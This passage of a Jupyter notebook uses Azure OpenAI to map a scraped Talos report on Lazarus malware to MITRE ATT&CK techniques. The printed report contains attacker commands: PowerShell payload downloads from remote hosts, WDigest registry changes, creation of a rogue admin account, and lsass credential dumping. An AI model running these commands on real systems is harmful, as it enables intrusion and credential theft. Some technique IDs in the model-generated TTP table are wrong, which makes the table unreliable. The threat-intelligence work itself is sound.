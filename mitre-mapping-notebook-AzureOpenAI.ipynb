{
  "cells": [
    {
      "cell_type": "markdown",
      "source": [
        "# Visualizing Cyber Threat Data: Building an Interactive Mitre Attack Navigator Layer and TTPs Timeline using Azure OpenAI\n",
        "\n",
        "__Notebook Version:__ 0.1 <br>\n",
        "__Notebook Author:__ [Antonio Formato](https://www.linkedin.com/in/antonioformato/)<br>\n",
        "__Inspired by:__ [Oleksiy Meletskiy](https://www.linkedin.com/in/alecm/)<br>\n",
        "\n",
        "\n",
        "__Python Version:__ >=Python 3.8<br>\n",
        "\n",
        "__Data Source Required:__ None<br>\n",
        "\n",
        "__GPU Compute Required:__ No<br>\n",
        "\n",
        "__Python Packages:__ \n",
        "- pandas\n",
        "- bs4\n",
        "- os \n",
        "- openai\n",
        "- dotenv\n",
        "- json\n",
        "- uuid\n",
        "- azure.storage.blob \n",
        "- azure.identity\n",
        "- base64\n",
        "- IPython\n",
        "- matplotlib\n",
        "\n",
        "## Prerequisites\n",
        "**Please do not run the notebook cells all at once**. The cells need to be run sequentially and successfully executed before proceeding with the remainder of the notebook.\n",
        "\n",
        "Make sure you have all the necessary libraries; use 'pip install' to install any missing ones.\n",
        "\n",
        "**Notice** To integrate the Mitre Attack Navigator, this notebook uses **Azure Blob Storage**: See paragraphs 5 and 6.\n",
        "\n",
        "## Overview\n",
        "\n",
        "Jupyter Notebook is a powerful tool that allows you to create and share documents that contain both code and rich text elements, such as figures, links, equations, etc. This versatility makes it a go-to tool for tasks that require iterative development and data exploration.\n",
        "\n",
        "One of the fascinating applications of Jupyter Notebook is in the field of Cybersecurity, where it can be used to **visualize cyber threat data**. This involves creating an interactive Mitre Attack Navigator Layer and TTPs (Tactics, Techniques, and Procedures) Timeline using Azure OpenAI.\n",
        "\n",
        "The process involves several steps, including building a web scraper for blog post data, leveraging Azure OpenAI for TTPs extraction, providing a Mitre Attack Layer JSON file, uploading to Mitre Attack Navigator, displaying the Mitre Attack Navigator Layer, generating an attack timeline with Mermaid, and visualizing the attack path.\n",
        "\n",
        "The notebook begins by <u>extracting insights from a blog post</u> using a web scraper. The scraped <u>blog post is then analyzed to extract TTPs</u> related to cybersecurity. The extracted TTPs are then used to <u>create a Mitre Attack Layer JSON file</u>. This file is then uploaded to the <u>Mitre Attack Navigator for visualization</u>. Finally, <u>the attack path is visualized</u> using a Mermaid.js timeline graph.\n",
        "\n",
        "This notebook stands as an **example of how Jupyter Notebook, coupled with Azure OpenAI, can be used to visualize complex data such as cyber threat data**. The resulting visualizations not only provide a clear picture of the threat landscape but also help in making informed decisions and strategies to counter the threats.\n",
        "\n",
        "## Table of Contents\n",
        "\n",
        "1. **Extracting Insights** - Building a Web Scraper for Blog Post Data\n",
        "2. **Revealing Content** - Printing the Scraped Blog Post\n",
        "3. **Analyzing Cyber Threats** - Leveraging Azure OpenAI for TTPs Extraction\n",
        "4. **Mitre Attack Navigator** Providing Mitre Attack Layer JSON File\n",
        "5. **Navigating Threats** - Uploading to Mitre Attack Navigator\n",
        "6. **Visualizing Threat** Landscape - Displaying Mitre Attack Navigator Layer\n",
        "7. **Unveiling Tactics** - Generating an Attack Timeline with Mermaid"
      ],
      "metadata": {
        "nteract": {
          "transient": {
            "deleting": false
          }
        },
        "run_control": {
          "frozen": false
        },
        "editable": true
      }
    },
    {
      "cell_type": "code",
      "source": [
        "pip install python-dotenv azure-storage-blob azure-identity"
      ],
      "outputs": [],
      "execution_count": null,
      "metadata": {
        "jupyter": {
          "source_hidden": false,
          "outputs_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        },
        "gather": {
          "logged": 1704755180748
        }
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## 1 **Extracting Insights** - Building a Web Scraper for Blog Post Data\n",
        "\n",
        "This section implements a web scraper to extract text content from a specified blog post URL (infosec writeup). \n",
        "\n",
        "Utilizing the requests library and BeautifulSoup (bs4), the code ensures successful retrieval of data before proceeding with the extraction.\n",
        "\n",
        "Example url: [https://blog.talosintelligence.com/lazarus_new_rats_dlang_and_telegram/](https://blog.talosintelligence.com/lazarus_new_rats_dlang_and_telegram/)"
      ],
      "metadata": {
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#Web scraper\n",
        "import requests\n",
        "from bs4 import BeautifulSoup\n",
        "import pandas as pd\n",
        "\n",
        "def scrape_text(url):\n",
        "    # Send a GET request to the URL\n",
        "    response = requests.get(url)\n",
        "\n",
        "    # If the GET request is successful, the status code will be 200\n",
        "    if response.status_code == 200:\n",
        "        # Get the content of the response\n",
        "        page_content = response.content\n",
        "        # Create a BeautifulSoup object and specify the parser\n",
        "        soup = BeautifulSoup(page_content, \"html.parser\")\n",
        "        # Get the text of the soup object\n",
        "        text = soup.get_text()\n",
        "        # Return the text\n",
        "        return text\n",
        "    else:\n",
        "        return \"Failed to scrape the website\"\n",
        "\n",
        "# Enter site\n",
        "print(\"Enter blog post writeup url\")\n",
        "url = input()\n",
        "\n",
        "text = scrape_text(url)"
      ],
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": "Enter blog post writeup url\n"
        }
      ],
      "execution_count": 1,
      "metadata": {
        "jupyter": {
          "source_hidden": false,
          "outputs_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        },
        "gather": {
          "logged": 1705357949667
        }
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## 2 (Optional) **Revealing Content** - Printing the Scraped Blog Post\n",
        "\n",
        "Following the web scraping, this section prints the extracted blog post text. It serves as a quick check to verify the successful retrieval and display of the scraped content\n"
      ],
      "metadata": {
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#print scraped post\n",
        "print(text)"
      ],
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": "\n\n\nOperation Blacksmith: Lazarus targets organizations worldwide using novel Telegram-based malware written in DLang\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nCisco Talos Blog\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSoftware\n\n\n\n\n\n\n\n\n\n\nVulnerability Information\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nVulnerability Information\n\n\n\nBACK\n\nVulnerability Reports\nMicrosoft Advisories\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                                Reputation Center\n                            \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nReputation Center\n\n\n\nBACK\n\nIP & Domain Reputation\nTalos File Reputation\nSecure Endpoint Naming Conventions\nIntelligence Categories\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSupport\n\n\n\n\n\n\n\nIncident Response\n\n\n\n\n\n\n\n\n\n\n\nCareers\n\n\n\n\n\n\n\n\nBlog\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nBlog\n\n\n\nBACK\n\n\nTalos Blog\n\n\nTalos Threat Source Newsletter\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                                Podcasts\n                            \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nPodcasts\n\n\n\nBACK\n\nBeers with Talos\nTalos Takes\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nAbout\n\n\n\n Search Blog\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nOperation Blacksmith: Lazarus targets organizations worldwide using novel Telegram-based malware written in DLang\n\n\nBy \nJungsoo An, \n                Asheer Malhotra, \n                Vitor Ventura\n\n\n\n            Monday, December 11, 2023 08:50\n        \n\n\n                                Threats\n                            \n\n                                RAT\n                            \n\n\n\n\nCisco Talos recently discovered a new campaign conducted by the Lazarus Group we’re calling “Operation Blacksmith,” employing at least three new DLang-based malware families, two of which are remote access trojans (RATs), where one of these uses Telegram bots and channels as a medium of command and control (C2) communications. We track this Telegram-based RAT as “NineRAT” and the non-Telegram-based RAT as “DLRAT.” We track the DLang-based downloader as “BottomLoader.”Our latest findings indicate a definitive shift in the tactics of the North Korean APT group Lazarus Group. Over the past year and a half, Talos has disclosed three different remote access trojans (RATs) built using uncommon technologies in their development, like QtFramework, PowerBasic and, now, DLang.Talos has observed an overlap between our findings in this campaign conducted by Lazarus including tactics, techniques and procedures (TTPs) consistent with the North Korean state-sponsored group Onyx Sleet (PLUTIONIUM), also known as the Andariel APT group. Andariel is widely considered to be an APT sub-group under the Lazarus umbrella. This campaign consists of continued opportunistic targeting of enterprises globally that publicly host and expose their vulnerable infrastructure to n-day vulnerability exploitation such as CVE-2021-44228 (Log4j). We have observed Lazarus target manufacturing, agricultural and physical security companies.Lazarus Group’s, Operation Blacksmith compromised manufacturing, agriculture and physical security sectorsOperation Blacksmith involved the exploitation of CVE-2021-44228, also known as Log4Shell, and the use of a previously unknown DLang-based RAT utilizing Telegram as its C2 channel. We’re naming this malware family “NineRAT.” NineRAT was initially built around May 2022 and was first used in this campaign as early as March 2023, almost a year later, against a South American agricultural organization. We then saw NineRAT being used again around September 2023 against a European manufacturing entity. During our analysis, Talos found some overlap with the malicious attacks disclosed by Microsoft in October 2023 attributing the activity to Onyx Sleet, also known as PLUTIONIUM or Andariel. Talos agrees with other researchers’ assessment that the Lazarus APT is essentially an umbrella of sub-groups that support different objectives of North Korea in defense, politics, national security and research and development. Each sub-group operates its own campaigns and develops and deploys bespoke malware against their targets, not necessarily working in full coordination. Andariel is typically tasked with initial access, reconnaissance and establishing long-term access for espionage in support of North Korean government interests. In some cases, Andariel has also conducted ransomware attacks against healthcare organizations.The current campaign, Operation Blacksmith, consists of similarities and overlaps in tooling and tactics observed in previous attacks conducted by the Andariel group within Lazarus.A common artifact in this campaign was  “HazyLoad,” a custom-made proxy tool previously only seen in the Microsoft report. Talos found HazyLoad targeting a European firm and an American subsidiary of a South Korean physical security and surveillance company as early as May 2023.In addition to Hazyload, we discovered “NineRAT” and two more distinct malware families — both DLang-based — being used by Lazarus. This includes a RAT family we’re calling “DLRAT” and a downloader we call “BottomLoader” meant to download additional payloads such as HazyLoad on an infected endpoint.The adoption of DLang in Lazarus’ malware — NineRAT, DLRAT and BottomLoaderNineRAT uses Telegram as its C2 channel for accepting commands, communicating their outputs and even for inbound and outbound file transfer. The use of Telegram by Lazarus is likely to evade network and host-based detection measures by employing a legitimate service as a channel of C2 communications.NineRAT consists of three components, a dropper binary that contains two other components embedded in it. The dropper will write the two components on the disk and delete itself. The first component is an instrumentor, called nsIookup.exe ( capital ‘i’ instead of lower case L) that will execute the second component and will be used in the persistence mechanism. Modular infection chains such as these are frequently used by threat actors to achieve a multitude of objectives from defense evasion to functional separation of components that can be upgraded or modified while avoiding noisy operations on an infected system.The dropper will set up persistence for the first component using a BAT script. The persistence mechanism accepts a service name, the path to the first component and service creation parameters:\n\nService Creation commandsc create Aarsvc_XXXXXX binPath=c:\\windows\\system32\\nsIookup.exe -k AarSvcGroup -p type=own start=auto DisplayName=Agent Activation Runtime_XXXXXX\n\n(Note the use of a capital “i” instead of “L” in nslookup[.]exe.)The instrumentor binary contains a preconfigured path to the NineRAT malware which is used to execute the malware:Instrumentor binary (first component) containing the path to NineRAT malware on disk.With NineRAT activated, the malware becomes the primary method of interaction with the infected host. However, previously deployed backdoor mechanisms, such as the reverse proxy tool HazyLoad, remain in place. The multiple tools give overlapping backdoor entries to the Lazarus Group with redundancies in the event a tool is discovered, enabling highly persistent access. In previous intrusions such as the one disclosed by Talos in 2022, Lazarus relied heavily on the use of proxy tools as a means of continued access to issue commands and exfiltrate data.The Telegram C2 channels used by the malware led to the discovery of a previously public Telegram bot “[at]StudyJ001Bot” that was leveraged by Lazarus in NineRAT. This Bot is publicly illustrated along with its ID and communication URL in a tutorial in Korean language from 2020. Using a publicly accessible bot may lead to infrastructure hijacking and likely having recognized that, Lazarus started using their own Bots for NineRAT. Interestingly, switching over to their own Telegram C2 channels, however, did not deter the use of older NineRAT samples using open channels. Anadriel has continued to use them well into 2023, even though they first started work on NineRAT in 2022. NineRAT typically consists of two API tokens for interacting with two different Telegram channels — one of these tokens is publicly listed.NineRAT interacts with the Telegram channel using DLang-based libraries implemented to talk to Telegram’s APIs. Initially, the implant tests authentication using the getMe method. The implant can upload documents to Telegram using the sendDocument method/endpoint or download files via the getFile method. The malware can accept the following commands from their operator Telegram:\n\nCommandCapability/infoGather preliminary information about the infected system./setmtokenSet a token value./setbtokenSet a new Bot token./setintervalSet time interval between malware polls to the Telegram channel./setsleepSet a time period for which the malware should sleep/lie dormant./upgradeUpgrade to a new version of the implant./exitExit execution of the malware./uninstallUninstall self from the endpoint./sendfileSend a file to the C2 server from the infected endpoint.\n\nNineRAT can also uninstall itself from the system using a BAT file.Below are some of the commands run by NineRAT for reconnaissance:\n\nCommandIntentwhoamiSystem Information Discovery [T1082]wmic os get osarchitectureSystem Information Discovery [T1082]WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayNameSoftware Discovery [T1518]\n\nPivoting off the NineRAT samples, we discovered two additional malware families written in DLang by Lazarus. One of these is simply a downloader we track as “BottomLoader” meant to download and execute the next stage payload from a remote host such as HazyLoad:Strings and embedded payload URL in the DLang-based downloader, BottomLoader.BottomLoader can download the next stage payload from a hardcoded remote URL via a PowerShell command:powershell Invoke-webrequest -URI <URL> -outfile <file_location_on_system>It can also upload files to the C2, again using PowerShell:powershell (New-Object System.Net.WebClient).UploadFile('<file_path>','<remote_url>’)BottomLoader can also create persistence for newer versions or completely new follow-up payloads by creating a “.URL” file in the Startup directory to run the PowerShell command to download the payload. The URL file is constructed using the following commands:\n\nCommandecho [InternetShortcut] > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\NOTEPAD.url\"echo URL=\"\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\NOTEPAD.url\"echo IconFile=C:\\WINDOWS\\system32\\SHELL32.dll >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\NOTEPAD.url\"echo IconIndex=20 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\NOTEPAD.url\"\n\nThe other malware is a downloader and RAT, we track as “DLRAT,” which can be used to deploy additional malware and retrieve commands from the C2 and execute them on the infected endpoints:DLRAT: A DLang-based RAT and downloader.This malware contains hardcoded commands to perform system reconnaissance. It starts by executing the commands on the endpoint to gather preliminary information about the system: “ver”, “whoami” and “getmac”. With this, the operators will have information about the version of the operating system, which user is running the malware and MAC address that allows them to identify the system on the network.DLRAT code snippet consisting of preliminary data gathering capabilities.Once the first initialization and beacon is performed, an initialization file is created, in the same directory, with the name “SynUnst.ini”.After beaconing to the C2, the RAT will post, in a multipart format, the collected information and hardcoded session information.During our analysis, we found that the session information ID used by DLRAT as part of its communications with its C2 server is “23wfow02rofw391ng23“, which is the same value that we found during our previous research into MagicRAT. In the case of MagicRAT, the value is encoded as an HTML post. But with DLRAT, it's being posted as multipart/form-data. This session information is hardcoded into the DLRAT malware as a base64-encoded string constructed on the process stack during runtime:Hardcoded Session ID in DLRAT, the same as MagicRAT.The C2 reply only contains the external IP address of the implant. The malware recognizes the following command codes/names sent by the C2 servers to execute corresponding actions on the infected system:\n\nCommand nameCapabilitydeletemeDelete itself from the system using a BAT file.downloadDownload files from a specified remote location.renameRename files on the system.iamsleepInstructs the implant to go to sleep for a specified amount of time.uploadUpload files to C2.showurlsEmpty command (Not implemented yet).\n\nIllustrating operation BlacksmithThis particular attack observed by Talos involves the successful exploitation of CVE-2021-44228, also known as Log4Shell, on publicly facing VMWare Horizon servers, as a means of initial access to vulnerable public-facing servers. Preliminary reconnaissance follows the initial access leading to the deployment of a custom-made implant on the infected system. Typical Infection chain observed in Operation Blacksmith.Phase 1: Initial reconnaissance by LazarusLazarus’s initial access begins with successful exploitation of CVE-2021-44228, the infamous Log4j vulnerability discovered in 2021. The vulnerability has been extensively exploited by the Lazarus umbrella of APT groups to deploy several pieces of malware and dual-use tools, and to conduct extensive hands-on-keyboard activity.\n\nCommandIntentcmd.exe /c whoamiSystem Information Discovery [T1082]cmd.exe /c wevtutil qe Microsoft-Windows-TerminalServices-LocalSessionManager/Operational /c:5 /q:*[System [(EventID=25)]] /rd:true /f:textQuery event logs: Get RDP session reconnection informationnet userSystem Information Discovery [T1082]cmd.exe /c dir /a c:\\users\\System Information Discovery [T1082]cmd.exe /c netstat -nap tcpSystem Information Discovery [T1082]systeminfoSystem Information Discovery [T1082]cmd.exe /c Reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WdigestOS Credential Dumping [T1003/005]cmd.exe /c reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1OS Credential Dumping [T1003/005]Modify Registry [T1112]cmd.exe /c tasklist | findstr SecuSoftware Discovery [T1518]\n\nOnce the initial reconnaissance has been completed, Lazarus’ operators deployed HazyLoad, a proxy tool used to establish direct access to the infected system without having to repeatedly exploit CVE-2021-44228.\n\nCommandActioncmd[.]exe /c powershell[.]exe -ExecutionPolicy ByPass -WindowStyle Normal (New-Object System[.]Net[.]WebClient).DownloadFile('hxxp[://]/inet[.]txt', 'c:\\windows\\adfs\\de\\inetmgr[.]exe');Download and execute HazyLoadc:\\windows\\adfs\\de\\inetmgr[.]exe -i  -pExecute HazyLoad reverse proxycmd /C powershell Invoke-WebRequest hxxp[://]/down/bottom[.]gif -OutFile c:\\windows\\wininet64[.]execmd /C c:\\windows\\wininet64[.]exe -i  -p 443Download and execute HazyLoad\n\nIn certain instances, the operators will also switch HazyLoad over to a new remote IP address. This is a common tactic attackers use to maintain continued access to previously compromised systems as their infrastructure evolves.\n\nCommandActioncmd /C taskkill /IM wininet64[.]exe /FStop original HazyLoad executioncmd /C c:\\windows\\wininet64[.]exe -i  -p 443ReLaunch HazyLoad with new parameters\n\nThe threat actors also created an additional user account on the system, granting it administrative privileges. Talos documented this TTP earlier this year, but the activity observed previously was meant to create unauthorized user accounts at the domain level. In this campaign, the operators created a local account, which matches the user account documented by Microsoft.\n\nCommandIntentcmd.exe /c net user krtbgt  /addAccount Creation [T1136]cmd.exe /c net localgroup Administrators krtbgt /addAccount Creation[T1098]cmd.exe /c net localgroup AdministratorsUser Discovery [T1033]\n\nOnce the user account was successfully set up, the attackers switched over to it for their hands-on-keyboard activity, which constitutes a deviation from the pattern Cisco Talos previously documented. The hands-on-keyboard activity begins by downloading and using credential dumping utilities such as ProcDump and MimiKatz.\n\nCommandIntentprocdump.exe -accepteula -ma lsass.exe lsass.dmpCredential harvesting [T1003]pwdump.exe   //MimikatzCredential harvesting [T1003]\n\nPhase 2: Lazarus deploys NineRATOnce the credential dumping is complete, Lazarus deploys a previously unknown RAT we’re calling “NineRAT” on the infected systems. NineRAT was first seen being used in the wild by Lazarus as early as March 2023. NineRAT is written in DLang and indicates a definitive shift in TTPs from APT groups falling under the Lazarus umbrella with the increased adoption of malware being authored using non-traditional frameworks such as the Qt framework, including MagicRAT and QuiteRAT.Once NineRAT is activated, it accepts preliminary commands from the Telegram-based C2 channel, to again fingerprint the infected systems. Re-fingerprinting the infected systems indicates the data collected by Lazarus via NineRAT may be shared by other APT groups and essentially resides in a different repository from the fingerprint data collected initially by Lazarus during their initial access and implant deployment phase.Commands typically executed by NineRAT include:\n\nCommandIntentcmd.exe /C ipconfig /allSystem Information Discovery [T1082]cmd.exe /C verSystem Information Discovery [T1082]cmd.exe /C wmic os get osarchitectureSystem Information Discovery [T1082]cmd.exe /C WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayNameSoftware Discovery [T1518]cmd.exe /C net group /domain Domain ComputersSystem Information Discovery [T1082]cmd.exe /C netstat -nap tcpSystem Information Discovery [T1082]cmd.exe /C whoamiSystem Information Discovery [T1082]\n\nCoverageWays our customers can detect and block this threat are listed below.Cisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free here.Cisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks.Cisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free here.Cisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual, Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat.Cisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products.Umbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella here.Cisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them.Additional protections with context to your specific environment and threat data are available from the Firewall Management Center.Cisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network.Open-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org.IOCsIOCs for this research can also be found at our GitHub repository here.HashesHazyLoad000752074544950ae9020a35ccd77de277f1cd5026b4b9559279dc3b86965eeeNineRAT534f5612954db99c86baa67ef51a3ad88bc21735bce7bb591afa8a4317c35433ba8cd92cc059232203bcadee260ddbae273fc4c89b18424974955607476982c447e017b40d418374c0889e4d22aa48633b1d41b16b61b1f2897a39112a435d30f91188d23b14526676706a5c9ead05c1a91ea0b9d6ac902623bc565e1c200a595b02fc3cfb5d74c09cab724b5b54c53a7c07e5766bffe5b1adf782c9e86a854182d4a0fef550af4f01a07041c16d851f262d859a3352475c62630e2c16a21defBottomLoader0e416e3cc1673d8fc3e7b2469e491c005152b9328515ea9bbd7cf96f1d23a99fDLRATe615ea30dd37644526060689544c1a1d263b6bb77fe3084aa7883669c1fde12f9a48357c06758217b3a99cdf4ab83263c04bdea98c347dd14b254cab6c81b13aNetwork IOCstech[.]micrsofts[.]comtech[.]micrsofts[.]tech27[.]102[.]113[.]93185[.]29[.]8[.]53155[.]94[.]208[.]209162[.]19[.]71[.]175201[.]77[.]179[.]66hxxp://27[.]102[.]113[.]93/inet[.]txthxxp[://]162[.]19[.]71[.]175:7443/sonic/bottom[.]gifhxxp[://]201[.]77[.]179[.]66:8082/img/lndex[.]phphxxp[://]201[.]77[.]179[.]66:8082/img/images/header/B691646991EBAEEC[.]gifhxxp[://]201[.]77[.]179[.]66:8082/img/images/header/7AEBC320998FD5E5[.]gif\n\n\n\nShare this post\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nRelated Content\n\n\nNew SugarGh0st RAT targets Uzbekistan government and South Korea\nNovember 30, 2023 08:00\nCisco Talos recently discovered a malicious campaign that likely started as early as August 2023, delivering a new remote access trojan (RAT) we dubbed “SugarGh0st.”\n\n\n\n\nAttackers use JavaScript URLs, API forms and more to scam users in popular online game “Roblox”\nNovember 2, 2023 07:58\nKnowing the common scams is an important step in using the platform safely. The following recommendations help players not fall into scams.\n\n\n\n\nArid Viper disguising mobile spyware as updates for non-malicious Android applications\nOctober 31, 2023 07:00\nSince April 2022, Cisco Talos has been tracking a malicious campaign operated by the espionage-motivated Arid Viper advanced persistent threat (APT) group targeting Arabic-speaking Android users.\n\n\n\n\n\n\n\n\n\n\n\n\n\nSoftware\n\n\nReputation Center\n\n\nVulnerability Information\n\n\nMicrosoft Advisory Snort Rules\n\n\nIncident Response\n\n\nSecure Endpoint Naming Conventions\n\n\nTalos File Reputation\n\n\nSupport Communities\n\n\nAbout\n\n\nCareers\n\n\nTalos Blog\n\n\nThreat Source Newsletter\n\n\nBeers with Talos Podcast\n\n\nTalos Takes Podcast\n\n\n\n\n\nConnect with us\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                    ©  Cisco Systems, Inc. and/or its affiliates. All rights reserved. View our Privacy Policy\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"
        }
      ],
      "execution_count": 2,
      "metadata": {
        "jupyter": {
          "source_hidden": false,
          "outputs_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        },
        "gather": {
          "logged": 1705357951539
        }
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## 3 **Analyzing Cyber Threats** - Leveraging Azure OpenAI for TTPs Extraction\n",
        "\n",
        "Using Azure OpenAI, this section extracts Tactics, Techniques, and Procedures (TTPs) related to cybersecurity from the previously scraped text. \n",
        "\n",
        "It leverages the power of Large Language Models to analyze and generate a table summarizing the identified cyber threat intelligence.\n",
        "\n",
        "<div style=\"color: Black; background-color: LightGoldenRodYellow; padding: 10px; font-size: 18px; line-height: 1.4;\">\n",
        "    <p>Make sure you have defined a .env file with all the following data:</p>\n",
        "    <ul style=\"font-size: 14px;\">\n",
        "        <li>AZURE_OPENAI_KEY</li>\n",
        "        <li>AZURE_OPENAI_ENDPOINT</li>\n",
        "        <li>DEPLOYMENT_NAME</li>\n",
        "    </ul>\n",
        "</div>\n",
        "\n",
        "<div style=\"border: solid; padding: 5pt\">\n",
        "<b>Notes: </b>\n",
        "<p>Azure OpenAI, through the default prompt in the code, extracts a table with TTPs from the writeup text.</p>\n",
        "</div>"
      ],
      "metadata": {
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#Provide TTPs table from article\n",
        "import os\n",
        "from openai import AzureOpenAI\n",
        "from dotenv import load_dotenv\n",
        "\n",
        "load_dotenv(\"OAIcanada.env\")\n",
        "\n",
        "# Set up OpenAI client\n",
        "client = AzureOpenAI(\n",
        "  azure_endpoint = os.getenv(\"AZURE_OPENAI_ENDPOINT\"), \n",
        "  api_key=os.getenv(\"AZURE_OPENAI_KEY\"),  \n",
        "  api_version=\"2023-05-15\"\n",
        "\n",
        ")\n",
        "\n",
        "#Function to provide TTPs (tactics and techniques) table from the scraped text\n",
        "def ttp(text):\n",
        "  response = client.chat.completions.create(\n",
        "      model=os.getenv(\"DEPLOYMENT_NAME\"), # model = \"deployment_name\"\n",
        "      messages=[\n",
        "          {\"role\": \"system\", \"content\": \"You are an AI assistant expert in cybersecurity, threat intelligence, and Mitre attack, assisting Infosec professionals in understanding cyber attacks.\"},\n",
        "          {\"role\": \"user\", \"content\": f\"With reference to ATT&CK Matrix for Enterprise extract TTPs (tactics and techniques) from text at the end of following prompt. For each techniques try to provide techniqueID, tactic, comment if you can get relevant content from text, producing a table with following columns:  technique, technique ID, tactic, comment. Text to work with: {text}\"}\n",
        "      ]\n",
        "  )\n",
        "\n",
        "  return response.choices[0].message.content\n",
        "\n",
        "ttptable = ttp(text)\n",
        "print(ttptable)"
      ],
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": "| Technique     | Technique ID | Tactic  | Comment | \n| ------------- | ------------ | ------- | ------- |\n| Remote Access Trojan | T1219 | Command and Control | Lazarus Group used Telegram-based RATs to target organizations worldwide |\n| Exploitation for Client Execution | T1203 | Execution | Lazarus Group exploited CVE-2021-44228 (Log4j) vulnerability known as Log4Shell for initial access |\n| System Information Discovery | T1082 | Discovery | NineRAT collects information about the infected system |\n| Disk Structure Discovery | T1005 | Discovery | Lazarus actors used 'dir /a c:\\users' command to overview disk structure |\n| Software Discovery | T1518 | Discovery | NineRAT checked for installed security software |\n| Command-Line Interface | T1059 | Execution | Used to execute programs via command line |\n| Use of Telegram for Command & Control | - | Command and Control | Novel technique used by Lazarus Group where Telegram was used as a C2 channel |\n| Data Obfuscation | T1027 | Defense Evasion | Processed obfuscated data via base64 encoding |\n| Service Exec | T1569 | Execution | Execution of malware through services |\n| Modify Registry | T1112 | Persistence, Privilege Escalation, Defense Evasion | Modification of the registry key HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\Wdigest to save passwords in plaintext |\n| Domain Trust Discovery  | T1482 | Discovery | Used 'net group /domain Domain Computers' command to list all computers in a domain |\n| System Network Configuration Discovery | T1016 | Discovery | Used 'ipconfig /all' command to obtain network configuration of the system |\n| Account Creation | T1136, T1098 | Persistence, Defense Evasion, Privilege Escalation | Creation of a new user account with administrative privileges |\n| Credentials in Registry | T1214 | Credential Access | Used Procdump and Mimikatz utilities to collect credentials |\n| File Transfer Protocols | T1048 | Command and Control | Used to transfer files into the infected network. |\n| Impair Defenses | T1562 | Defense Evasion | Removal of security tools to evade detection |\n"
        }
      ],
      "execution_count": 3,
      "metadata": {
        "jupyter": {
          "source_hidden": false,
          "outputs_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        },
        "gather": {
          "logged": 1705357988610
        }
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## 4 **Mitre Attack Navigator** Providing Mitre Attack Layer JSON File\n",
        "This section focuses on the creation and provision of a Mitre Attack Layer JSON file, incorporating Tactics, Techniques, and Procedures (TTPs) identified in a cyber threat scenario. \n",
        "\n",
        "Leveraging Azure OpenAI capabilities, the code generates a JSON file formatted for MITRE ATT&CK Navigator, facilitating the visualization of cyber threat data. The included TTPs are extracted from the provided prompt table, resulting in a detailed and actionable representation of the threat landscape.\n",
        "\n",
        "Note: Ensure that the provided ttptable variable contains valid Tactics, Techniques, and Procedures extracted from the cyber threat intelligence analysis section.\n",
        "\n",
        "\n",
        "<div style=\"border: solid; padding: 5pt\">\n",
        "<b>Notes: </b>\n",
